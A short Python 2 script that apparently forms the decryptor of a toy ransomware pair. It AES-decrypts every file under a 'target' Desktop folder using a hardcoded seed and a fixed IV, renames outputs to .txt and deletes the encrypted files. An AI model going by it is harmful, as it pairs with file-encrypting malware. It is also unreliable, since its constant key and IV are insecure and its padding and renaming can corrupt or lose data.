#!/usr/bin/python
import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

path = [ os.getenv('HOME') + "/Desktop/Important"] #path of our target folder already encrypted


def dencrypt_file(password,filename):

    chunksize = 65536

    direx, ext = os.path.splitext(filename)
    ext += ' ' * (16 - (len(ext) % 16))

    enc_outputfile = direx + ".txt"
    file_size = str(os.path.getsize(filename)).zfill(16)
    init_vector = ''

    for i in range(16):
    	init_vector += chr(7)

    dencryptor = AES.new(password,AES.MODE_CBC, init_vector)
    with open(filename, 'rb') as file_handler:
        with open(enc_outputfile, 'wb') as outputfile_handler:
            while True:
                chunk_read = file_handler.read(chunksize)
                if len(chunk_read) == 0:
                    break
                elif len(chunk_read) % 16 != 0:
                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                outputfile_handler.write(dencryptor.decrypt(chunk_read))

    os.unlink(filename) #Replace encrypted file with original file



for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print names+'\r'
            print root+'\r'
	    dencrypt_file(SHA256.new("this_is_the_seed").digest(),str(os.path.join(root,names)))
